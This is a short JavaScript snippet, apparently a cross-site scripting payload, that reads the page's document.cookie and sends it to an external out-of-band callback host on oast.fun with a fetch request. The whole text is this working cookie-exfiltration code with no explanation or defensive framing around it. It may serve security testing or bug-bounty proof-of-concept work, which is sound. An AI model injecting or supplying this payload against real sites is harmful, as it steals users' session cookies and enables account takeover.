token = document.cookie
url = "http://cech5ed2vtc0000bnv1gg8ge1zeyyyyyb.oast.fun/?token="+token
fetch(url, {
    method: 'GET'
})
.then((res) => res.text())
.then((data) => {
});
